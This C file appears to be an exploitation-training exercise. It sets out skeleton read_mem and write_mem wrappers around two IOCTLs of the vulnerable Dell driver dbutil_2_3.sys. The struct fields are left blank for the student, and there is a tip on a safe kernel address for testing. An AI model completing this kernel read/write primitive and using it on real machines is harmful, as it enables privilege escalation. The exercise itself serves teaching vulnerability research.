/*
 *  Exercise 2
 *  We have 2 interesting IOCTLs, what is their function?
 *  What argument(s) do we have to pass to abuse them?
 */


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdint.h>


/*
 * ~~(2)~~
 *
 *  This struct is passed as the "input buffer" (as well as the output 
 *  buffer) to the DeviceIoControl call and is used by both control code
 *  functions to perform their actions.
 *
 *  Figure out the functionality of both control codes and use that knowledge
 *  to -rename- each variable in the below struct according to their use.
 */
typedef struct data_struct
{
    uint64_t ignore;
    uint8_t *unk1;
    uint64_t unk2;
    uint64_t unk3;
} DATA;

/*
 *  ~~(1)~~
 *
 *  Rename the below 2 functions according to their functionality
 */
void
write_mem(HANDLE h, uint8_t *a, uint64_t v)
{
    uint32_t tmp;
    DATA data;

    /* 
     *  ~~(3)~~
     *  
     *  Set up the rest of the data struct to correctly call this IOCTL
     */
    
    // data.unk1 = ;
    // data.unk2 = ;
    // data.unk3 = ;

    // Calling function for IOCTL 0x9b0c1ec8
    if (!DeviceIoControl(h, 0x9b0c1ec8, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
        printf("DeviceIoControl error\n");
}

uint64_t
read_mem(HANDLE h, uint8_t *a)
{
    uint32_t tmp;
    DATA data;

    /* 
     *  ~~(3)~~
     *  
     *  Set up the rest of the data struct to correctly call this IOCTL
     */

    // data.unk1 = ;
    // data.unk2 = ;

    // Calling function for IOCTL 0x9b0c1ec4
    if (!DeviceIoControl(h, 0x9b0c1ec4, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
        printf("DeviceIoControl error\n");

    return data.unk3;
}



int main(int argc, char *argv[]) {
    
    HANDLE h = CreateFile("\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
    {
        printf("FATAL ERROR: Failed to open handle, check if dbutil_2_3.sys is running\n");
        exit(-1);
    }




    /*
     * ~~(4)~~
     *
     *  Call write_mem with the correct parameter(s) 
     *  and print the result. 
     *
     *  TIP: On w10 you can use the always-mapped
     *  memory address of 0xfffff78000000000. This will
     *  ensure you don't get a blue screen when you interact
     *  with it.
     */



    CloseHandle(h);

    return 0;
}
